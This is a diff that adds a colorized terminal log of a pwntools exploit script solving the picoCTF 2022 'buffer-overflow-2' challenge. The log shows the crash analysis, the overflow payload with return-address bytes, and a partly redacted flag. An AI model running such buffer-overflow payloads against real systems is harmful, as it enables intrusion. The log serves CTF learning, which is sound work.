@@ -1,0 +1,17 @@
+[0;31m$[0m python3 buffer-overflow-2-automated.py REMOTE
+[[0;34m*[0m] Loaded 10 cached gadgets for './vuln'
+[[0;32m+[0m] Starting local process '/home/kali/ctfs/pico22/buffer-overflow-2/vuln': pid 4993
+[[0;34m*[0m] Process '/home/kali/ctfs/pico22/buffer-overflow-2/vuln' stopped with exit code -11 (SIGSEGV) (pid 4993)
+[[0;32m+[0m] Parsing corefile...: Done
+[[0;34m*[0m] '/home/kali/ctfs/pico22/buffer-overflow-2/core'
+    Arch:      i386-32-little
+    EIP:       0x62616164
+    ESP:       0xffd07fc0
+    Exe:       '/home/kali/ctfs/pico22/buffer-overflow-2/vuln' (0x8048000)
+    Fault:     0x62616164
+[[0;32m+[0m] Opening connection to saturn.picoctf.net on port [0;90m[PORT][0m: Done
+[[0;34m*[0m] Switching to interactive mode
+Please enter your string: 
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab\\x96\\x\\xf0\\xfe\\xca
+picoCTF{argum3nt5_4_d4yZ_[0;90m[REDACTED][0m}
+[0;31m$[0m [[0;34m*[0m] Got EOF while reading in interactive
